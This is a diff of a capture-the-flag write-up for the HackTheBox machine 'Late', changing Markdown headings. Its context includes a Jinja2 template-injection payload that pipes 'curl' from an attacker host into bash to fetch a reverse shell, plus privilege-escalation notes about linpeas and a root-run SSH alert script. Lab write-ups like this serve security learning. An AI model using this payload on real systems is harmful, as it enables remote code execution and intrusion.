@@ -30,7 +30,7 @@ tags: [ssti, hashcat]
 
 Visiting the website leads us to a simple landing page with marketing materials for an online photo editor. Going through the pages within the site gives us a link to `images.late.htb`, which we can include in our `/etc/hosts` file to browse.
 
-#### Server-Side Template Injection
+### Server-Side Template Injection
 
 The `images.late.htb` site contains an Image to Text conversion application. It uses some Optical Character Recognition (OCR) library to detect any text from an image, and return it back in the response. This application seems to be an implementation of [lucadibello/ImageReader](https://github.com/lucadibello/ImageReader), which renders the `text` output using the `render_template` function.
 
@@ -65,11 +65,11 @@ This required a lot of tinkering of the image to get the exploit to work. The OC
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen("curl 10.10.10.10 | bash".read() }}
 ```
 {% endraw %}
-###### ***Note:*** I hosted a Reverse-Shell Bash script in an HTTP server so that it can pipe that over to `bash` after `curl`ing it.
+ **TIP:** I hosted a Reverse-Shell Bash script in an HTTP server so that it can pipe that over to `bash` after `curl`ing it.
 
 ***And, we're in!***
 
-#### Privilege Escalation
+### Privilege Escalation
 
 Running `linpeas.sh` would give us back an interesting script file: `/usr/local/sbin/ssh-alert.sh`. This seems to sends an email notification to `root@late.htb` whenever an SSH login is detected.
 
